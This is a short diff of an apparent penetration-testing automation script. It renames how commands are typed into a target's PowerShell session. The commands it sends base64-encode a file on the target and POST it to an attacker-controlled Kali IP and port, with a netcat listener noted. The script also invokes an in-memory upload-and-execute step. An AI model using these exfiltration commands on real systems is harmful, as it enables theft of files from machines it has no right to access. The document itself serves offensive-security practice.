@@ -19,13 +19,13 @@ FILE="PSUpload.ps1"
 
 ps_webclient_upload_file_and_execute_in_memory "${LOCATION}" "${FILE}"
 
-paste_command "# make sure nc -lvnp ${LISTEN_PORT} is running in another window > echo <base64> | base64 -d -w 0 > $(basename "$(echo "${UPLOAD_FILE_LOCATION}" | sed 's|\\|/|g')")"
-xdotool key Return
+execute_command "# make sure nc -lvnp ${LISTEN_PORT} is running in another window > echo <base64> | base64 -d -w 0 > $(basename "$(echo "${UPLOAD_FILE_LOCATION}" | sed 's|\\|/|g')")"
+create_new_line
 sleep 1
 
-paste_command "\$b64 = [System.convert]::ToBase64String((Get-Content -Path '${UPLOAD_FILE_LOCATION}' -Encoding Byte))"
-xdotool key Return
+execute_command "\$b64 = [System.convert]::ToBase64String((Get-Content -Path '${UPLOAD_FILE_LOCATION}' -Encoding Byte))"
+create_new_line
 sleep 1
 
-paste_command "Invoke-WebRequest -Uri http://${KALI_IP}:${LISTEN_PORT} -Method POST -Body \$b64"
-xdotool key Return
+execute_command "Invoke-WebRequest -Uri http://${KALI_IP}:${LISTEN_PORT} -Method POST -Body \$b64"
+create_new_line
